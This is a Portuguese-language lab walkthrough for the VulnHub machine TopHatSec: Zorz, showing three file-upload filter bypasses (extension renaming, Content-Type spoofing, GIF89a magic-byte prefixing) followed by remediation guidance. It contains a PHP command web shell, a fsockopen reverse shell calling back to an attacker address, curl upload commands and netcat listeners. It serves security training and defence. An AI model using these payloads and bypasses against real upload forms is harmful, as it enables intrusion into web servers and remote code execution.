# TopHatSec: Zorz — Três Formulários de Upload, Três Bypasses

Bora rapaziada!! Zorz é um desafio dedicado de segurança de upload de arquivos: três formulários de upload progressivamente mais difíceis, cada um com níveis diferentes de filtragem, e sua tarefa é contornar todos os três e obter um shell. Sem recon complexo, sem movimento lateral: apenas metodologia pura de bypass de upload aplicada em dificuldade crescente. Essa máquina é sensacional para aprender exatamente o que separa um bypass de upload bom de uma tentativa de script-kiddie. Sério mesmo.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | TopHatSec: Zorz |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tophatsec-zorz,117/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force dirb, bypass de upload (renomeação de extensão, manipulação Content-Type, prefixo de magic bytes), PHP reverse shell via cada nível de desafio |
| **CVEs** | CWE-434 (Upload Irrestrito de Arquivo com Tipo Perigoso: todos os três níveis de desafio), CWE-345 (Verificação Insuficiente de Autenticidade de Dados: bypass de verificação tipo MIME e extensão) |
| **Grupos APT** | APT41: explora vulnerabilidades de upload de arquivos em aplicações web como vetor principal de acesso inicial; FIN7: usa técnicas de bypass de upload para implantar webshells em ataques direcionados a aplicações web |

---

## Resumo do Ataque

```
nmap → porta 80 (HTTP)
  → dirb: descobrir /uploader/ e páginas de desafio
  → Desafio 1: sem filtragem real → renomear shell.php → shell.php (ou .php5)
  → Desafio 2: filtro Content-Type → alterar MIME para image/jpeg na requisição
  → Desafio 3: filtro magic bytes → prefixar GIF89a; no shell PHP
  → todos os três → sessões netcat → www-data
```

---

## Metodologia

1. Descoberta de host e varredura de portas
2. dirb para enumerar páginas de desafio de upload
3. Desafio 1: testar upload PHP básico (sem filtragem ou apenas extensão)
4. Desafio 2: contornar filtragem Content-Type com spoofing MIME
5. Desafio 3: contornar verificação de magic bytes prefixando cabeçalho GIF89a
6. Coletar reverse shells dos três desafios

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.129

nmap -sV -sC 192.168.1.129
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
```

Serviço HTTP único. A máquina é um desafio exclusivamente web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Enumeração Web

```bash
dirb http://192.168.1.129/ /usr/share/wordlists/dirb/common.txt
```

Descubra páginas de desafio de upload:

```
/uploader/
/uploader/upload1.php   (Desafio 1)
/uploader/upload2.php   (Desafio 2)
/uploader/upload3.php   (Desafio 3)
/uploader/uploads/      (onde os arquivos ficam)
```

Cada desafio é um formulário de upload com complexidade de filtragem crescente.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Desafio 1: Upload Básico (Sem Filtragem Real)

O Desafio 1 tem validação mínima ou nenhuma no servidor. Faça upload de um PHP reverse shell diretamente:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edite LHOST e LPORT

# Inicie o listener
nc -lvnp 4444

# Faça upload de shell.php pelo formulário em /uploader/upload1.php
# Se .php for bloqueado, tente:
mv shell.php shell.php5
# ou: shell.phtml, shell.pHp, shell.PHP, shell.phar
```

Após o upload, acione o shell:

```bash
curl http://192.168.1.129/uploader/uploads/shell.php
```

Callback netcat: `www-data`.

**Nota real:** Muitos formulários de upload verificam apenas a extensão do arquivo e confiam no nome do arquivo. Renomear um arquivo PHP para `.php5` ou `.phtml` contorna filtros de extensão baseados em blacklist em configurações Apache que não bloqueiam explicitamente essas extensões.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1505.003 — Web Shell

---

## Passo 4 — Desafio 2: Bypass Content-Type / MIME

O Desafio 2 verifica o header HTTP `Content-Type` do arquivo carregado. O servidor espera um tipo MIME de imagem (`image/jpeg`, `image/png`, etc.) mas não verifica o conteúdo real do arquivo.

Intercepte a requisição de upload com Burp Suite e modifique o header Content-Type:

**Requisição original:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

**Requisição modificada:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

Ou com curl:

```bash
curl -F "file=@/tmp/shell.php;type=image/jpeg" \
  http://192.168.1.129/uploader/upload2.php
```

O servidor aceita o arquivo porque Content-Type diz que é uma imagem. O conteúdo real é PHP. Acione:

```bash
curl http://192.168.1.129/uploader/uploads/shell.php
```

**Nota real:** Validação Content-Type é controlada pelo cliente: qualquer cliente HTTP pode enviar qualquer header Content-Type. Validação no servidor deve verificar o conteúdo do arquivo, não os headers. Numerosos CVEs em CMSs (WordPress, Drupal, Joomla) exploitaram exatamente esse padrão.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1036 — Mascaramento

---

## Passo 5 — Desafio 3: Bypass de Magic Bytes

O Desafio 3 lê os primeiros bytes do arquivo carregado (magic bytes) para verificar se é realmente uma imagem. Magic bytes de arquivo PHP são claramente PHP, enquanto JPEG começa com `\xff\xd8\xff` e GIF começa com `GIF89a`.

Prefixe os magic bytes GIF ao shell PHP:

```bash
# Método 1: Prefixar string GIF89a
echo -n "GIF89a" > /tmp/shell3.php
cat /usr/share/webshells/php/php-reverse-shell.php >> /tmp/shell3.php
# Edite LHOST e LPORT no arquivo após o prefixo

# Método 2: Criar manualmente
cat > /tmp/shell3.php << 'EOF'
GIF89a
<?php
$sock = fsockopen("192.168.1.x", 4445, $errno, $errstr, 30);
$proc = proc_open("/bin/sh", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>
EOF
```

Faça upload pelo formulário do Desafio 3. A verificação de magic bytes passa (vê `GIF89a`). Apache ainda executa como PHP por causa da extensão `.php`.

```bash
nc -lvnp 4445
curl http://192.168.1.129/uploader/uploads/shell3.php
```

Callback netcat: `www-data`. Desafio 3 concluído.

**Nota real:** Validação de magic bytes previne ataques ingênuos de "olhar apenas para a extensão", mas é derrotada no momento em que o arquivo ainda tem uma extensão executável por PHP. Validação verdadeira requer: (1) verificação de magic bytes, (2) whitelist de extensão, (3) validação de tipo MIME E (4) armazenar uploads FORA do web root. APT41 especificamente usa prefixo de magic bytes em operações de implantação de webshell.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1027 — Arquivos ou Informações Ofuscadas

---

## Flags, Hashes e Credenciais Capturadas

| Desafio | Acesso | Método de Upload | Shell Como |
|---|---|---|---|
| 1 | /uploader/upload1.php | Upload PHP direto ou renomeação .php5 | www-data |
| 2 | /uploader/upload2.php | Spoofing Content-Type: image/jpeg | www-data |
| 3 | /uploader/upload3.php | Prefixo GIF89a de magic bytes | www-data |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Filtragem apenas por extensão contornada com .php5/.phtml | Filtragem de extensão baseada em blacklist é inerentemente incompleta: sempre há outra extensão para tentar | Use whitelist de extensão (permita apenas .jpg, .png, .gif etc.); bloqueie explicitamente todas as variantes PHP na config Apache/Nginx |
| 2 | Bypass de header Content-Type | Content-Type é controlado pelo cliente e não pode ser confiado para decisões de segurança | Leia o conteúdo real do arquivo; nunca confie em headers para validação de tipo de arquivo |
| 3 | Bypass de magic bytes via prefixo GIF89a | Verificar apenas magic bytes é insuficiente se o arquivo ainda tem uma extensão PHP | Defesa requer verificações em camadas: magic bytes + whitelist de extensão + validação MIME + armazenar fora do web root |
| 4 | Todos os desafios ficam em /uploads/ dentro do web root | Mesmo com validação correta do tipo de arquivo, executar conteúdo carregado é perigoso se armazenado no web root | Armazene todos os uploads fora do document root; use processo separado para servir arquivos estáticos; nunca execute conteúdo carregado |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Evasão de Defesa | Evasão de Defesa | Mascaramento: Spoofing de Tipo MIME | T1036 |
| Evasão de Defesa | Evasão de Defesa | Arquivos Ofuscados: Magic Bytes | T1027 |
| Persistência | Persistência | Web Shell | T1505.003 |
| Execução | Execução | Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Valide o conteúdo do arquivo no servidor** — verifique magic bytes E extensão E tipo MIME; todos os três, não apenas um
2. **Use whitelist de extensões permitidas** — permita apenas `.jpg`, `.png`, `.gif`, `.pdf`, `.docx`; bloqueie tudo mais incluindo `.php`, `.php5`, `.phtml`, `.phar`
3. **Armazene uploads FORA do web root** — `/var/uploads/` não `/var/www/html/uploads/`; sirva via endpoint controlado
4. **Desative execução PHP em diretórios de upload** — Apache: `php_admin_value engine Off` no `.htaccess` do diretório de upload ou config do vhost
5. **Use CDN ou armazenamento de objetos para uploads de usuários** — S3, CloudFront ou equivalente remove a execução PHP completamente do caminho de upload
6. **Renomeie arquivos carregados no servidor** — use nomes UUID; remova a extensão original; previne acionamento direto por conhecer o caminho de upload

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os endpoints de upload de arquivo em aplicações web |
| Proteger | Controle de Acesso | Armazenar uploads fora do web root; desativar PHP em dirs de upload |
| Proteger | Segurança de Dados | Validação de conteúdo: magic bytes + whitelist de extensão + MIME |
| Detectar | Anomalias e Eventos | Alertar sobre uploads de arquivo PHP; regras de detecção de webshell (Suricata/ModSecurity) |
| Responder | Planejamento de Resposta | Remover todos os webshells carregados; auditar logs de upload para evidências de exploração |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Input de Informação | Validar conteúdo do arquivo no servidor: magic bytes, extensão, MIME |
| CM-7 | Funcionalidade Mínima | Desativar execução PHP em diretórios de upload; whitelist de tipos de arquivo |
| SC-28 | Proteção de Informação em Repouso | Armazenar uploads fora do web root; usar nomes UUID |
| AU-12 | Geração de Registro de Auditoria | Registrar todos os eventos de upload de arquivo; alertar sobre uploads de PHP ou script |

### CISA KEV

Upload irrestrito de arquivo (CWE-434) está consistentemente nas classes de vulnerabilidades web mais exploradas segundo CISA. O Alerta CISA AA21-131A aborda especificamente a implantação de webshell via upload de arquivo como uma técnica principal de atores de ameaça. Organizações devem tratar qualquer upload de arquivo em aplicação web como um vetor potencial de RCE requerendo controles de defesa em profundidade.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configurações de Ativos de TI | MIL2 |
| Consciência Situacional (SITUATION) | Realizar Registro de Logs | MIL3 |

### MITRE D3FEND

- **D3-FV** — Validação de Arquivo (validação de conteúdo: magic bytes + extensão + MIME no servidor)
- **D3-ACH** — Hardening de Configuração de Aplicação (PHP desativado em dirs de upload; armazenar fora do web root)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (permissões de sistema de arquivos restringindo execução de upload)

---

## Considerações Finais

Zorz é o curso de segurança de upload de arquivo que você não sabia que precisava. Três desafios, três técnicas, três lições: bypass de extensão, bypass Content-Type, bypass de magic bytes. Cada um constrói sobre o anterior e juntos mostram exatamente por que validação de upload de arquivo requer defesa em profundidade, não uma única verificação.

A lição real: não há verificação única que pare todos os ataques de upload de arquivo. A única defesa confiável é armazenar uploads fora do web root e servi-los através de um endpoint controlado e não executável. Todo o resto é uma camada que você pode adicionar para defesa em profundidade, não uma solução completa.

Thanks guys!! (❍ᴥ❍ʋ)
